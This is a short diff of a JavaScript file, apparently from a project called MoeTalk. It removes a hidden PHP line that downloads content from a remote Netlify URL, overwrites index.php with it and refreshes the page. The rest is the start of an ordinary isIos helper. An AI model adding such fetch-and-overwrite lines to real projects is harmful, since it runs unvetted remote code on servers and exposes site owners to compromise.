@@ -1,4 +1,3 @@
-//<?php file_put_contents('index.php',file_get_contents('https://moetalk.netlify.app/MoeData/phpwin.html'));header('Refresh:0');?>
 async function isIos()
 {
 	let type = await $.ajax(
